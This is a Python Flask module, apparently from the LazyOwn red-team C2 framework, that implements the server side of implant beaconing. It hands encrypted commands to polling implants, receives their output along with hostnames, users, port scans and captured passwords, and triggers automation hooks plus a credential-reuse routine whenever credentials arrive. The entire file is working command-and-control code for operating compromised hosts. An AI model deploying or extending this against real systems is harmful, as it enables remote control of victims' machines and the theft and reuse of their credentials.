"""Beacon communication blueprint for the LazyOwn C2 server.

Handles implant polling, command delivery, result collection, file transfer,
and beacon lifecycle events. Integrates the conditional hooks engine so
operator-defined automation rules fire on beacon connection/disconnection.

Registered from ``lazyc2.py`` without a prefix so the existing malleable
routes (``/command``, ``/upload``, etc.) stay at their original paths.
"""

from __future__ import annotations

import json
import logging
import threading
from typing import Any

from flask import Blueprint, Response, jsonify, request

logger = logging.getLogger(__name__)

beacon_bp = Blueprint("beacon", __name__)

_commands: dict[str, str] = {}
_results: dict[str, Any] = {}
_commands_history: dict[str, list[str]] = {}
_connected_clients: set[str] = set()
_encrypt_fn = None
_decrypt_fn = None
_config = None
_sessions_dir = "sessions"
_route_malleable = ""


def init_beacon_bp(
    commands: dict[str, str],
    results: dict[str, Any],
    commands_history: dict[str, list[str]],
    connected_clients: set[str],
    encrypt_fn,
    decrypt_fn,
    config,
    sessions_dir: str = "sessions",
    route_malleable: str = "",
) -> None:
    """Wire the blueprint to the C2 monolith's shared state.

    Args:
        commands: Shared command queue dict.
        results: Shared results dict.
        commands_history: Shared command history dict.
        connected_clients: Shared connected clients set.
        encrypt_fn: AES encrypt callable.
        decrypt_fn: AES decrypt callable.
        config: LazyOwn Config instance.
        sessions_dir: Path to sessions directory.
        route_malleable: Malleable C2 route prefix.
    """
    global _commands, _results, _commands_history, _connected_clients
    global _encrypt_fn, _decrypt_fn, _config, _sessions_dir, _route_malleable
    _commands = commands
    _results = results
    _commands_history = commands_history
    _connected_clients = connected_clients
    _encrypt_fn = encrypt_fn
    _decrypt_fn = decrypt_fn
    _config = config
    _sessions_dir = sessions_dir
    _route_malleable = route_malleable


def _fire_hooks(event: str, context: dict[str, Any]) -> list[dict[str, Any]]:
    """Fire conditional hooks for a beacon lifecycle event."""
    try:
        from modules.conditional_hooks import get_hook_engine
        engine = get_hook_engine()
        engine.set_placeholders({
            "rhost": getattr(_config, "rhost", "") if _config else "",
            "lhost": getattr(_config, "lhost", "") if _config else "",
            "domain": getattr(_config, "domain", "") if _config else "",
        })
        return engine.fire(event, context)
    except Exception as exc:
        logger.debug("[hooks] fire failed for %s: %s", event, exc)
        return []


def _trigger_cred_reuse(context: dict[str, Any]) -> None:
    """Trigger credential reuse analysis in background."""
    try:
        from modules.credential_reuse import get_credential_reuse_engine
        from modules.state_manager import StateManager

        def _run():
            engine = get_credential_reuse_engine()
            state = StateManager()
            candidates = engine.suggest_from_state_manager(state, limit=10)
            if candidates:
                summary = engine.get_summary(candidates)
                logger.info("[cred_reuse]\n%s", summary)

        threading.Thread(target=_run, daemon=True).start()
    except Exception as exc:
        logger.debug("[cred_reuse] background check failed: %s", exc)


@beacon_bp.route("/command/<client_id>", methods=["GET"])
def send_command(client_id: str):
    """Implant polls for the next encrypted command."""
    if _route_malleable:
        beacon_bp.add_url_rule(
            f"{_route_malleable}<client_id>",
            "send_command_malleable",
            send_command,
            methods=["GET"],
        )

    _connected_clients.add(client_id)
    if client_id in _commands:
        command = _commands.pop(client_id)
        encrypted_command = _encrypt_fn(command.encode())
        return Response(encrypted_command)
    encrypted_response = _encrypt_fn(b"")
    return Response(encrypted_response, mimetype="application/octet-stream")


@beacon_bp.route("/command/<client_id>", methods=["POST"])
def receive_result(client_id: str):
    """Implant reports command output."""
    if _route_malleable:
        beacon_bp.add_url_rule(
            f"{_route_malleable}<client_id>",
            "receive_result_malleable",
            receive_result,
            methods=["POST"],
        )

    try:
        encrypted_data = request.get_data()
        decrypted_data = _decrypt_fn(encrypted_data)
        data = json.loads(decrypted_data)

        required_keys = ["output", "command", "client", "pid", "hostname",
                         "ips", "user", "discovered_ips", "result_portscan", "result_pwd"]
        if not data or not all(key in data for key in required_keys):
            return jsonify({"status": "error", "message": "Invalid data format"}), 400

        output = data["output"]
        client_os = data["client"]
        pid = data["pid"]
        hostname = data["hostname"]
        ips = data["ips"]
        user = data["user"]
        discovered_ips = data["discovered_ips"]
        result_portscan = data["result_portscan"]
        result_pwd = data["result_pwd"]
        command = data["command"]

        sanitized_id = "".join(c for c in client_id if c.isalnum() or c in "-_")
        if not sanitized_id or sanitized_id != client_id:
            return jsonify({"status": "error", "message": "Invalid client_id format"}), 400

        primary_ip = str(ips).split(",")[0].strip().strip("[]\"'")

        _results[sanitized_id] = {
            "output": output, "client": client_os, "pid": pid,
            "hostname": hostname, "ips": ips, "user": user,
            "discovered_ips": discovered_ips, "result_portscan": result_portscan,
            "result_pwd": result_pwd, "command": command,
        }

        was_new = sanitized_id not in _connected_clients
        _connected_clients.add(sanitized_id)

        if was_new:
            logger.info("[beacon] New implant connected: %s (%s)", sanitized_id, primary_ip)
            _fire_hooks("beacon_connected", {
                "client_id": sanitized_id, "ip": primary_ip,
                "hostname": hostname, "user": user,
                "platform": client_os,
            })

        _fire_hooks("command_executed", {
            "client_id": sanitized_id, "command": command,
            "output": output[:500],
        })

        if result_pwd and ":" in str(result_pwd):
            _fire_hooks("credential_captured", {
                "host": primary_ip,
                "username": user,
            })
            _trigger_cred_reuse({"host": primary_ip, "username": user})

        if result_portscan:
            for port_str in str(result_portscan).split(","):
                port_str = port_str.strip()
                try:
                    port = int(port_str)
                    _fire_hooks("service_detected", {"host": primary_ip, "port": port})
                except ValueError:
                    pass

        return jsonify({"status": "success", "Platform": client_os}), 200

    except json.JSONDecodeError:
        return jsonify({"status": "error", "message": "Invalid JSON"}), 400
    except Exception:
        logger.exception("[beacon] Unexpected error in receive_result")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


@beacon_bp.route("/issue_command", methods=["POST"])
def issue_command():
    """Operator queues a command for a connected implant."""
    client_id = request.form.get("client_id", "")
    command = request.form.get("command", "")
    if not client_id or not command:
        return jsonify({"status": "error", "message": "client_id and command required"}), 400

    _commands[client_id] = command
    if client_id not in _commands_history:
        _commands_history[client_id] = []
    _commands_history[client_id].append(command)

    return jsonify({"status": "ok", "client_id": client_id, "command": command})
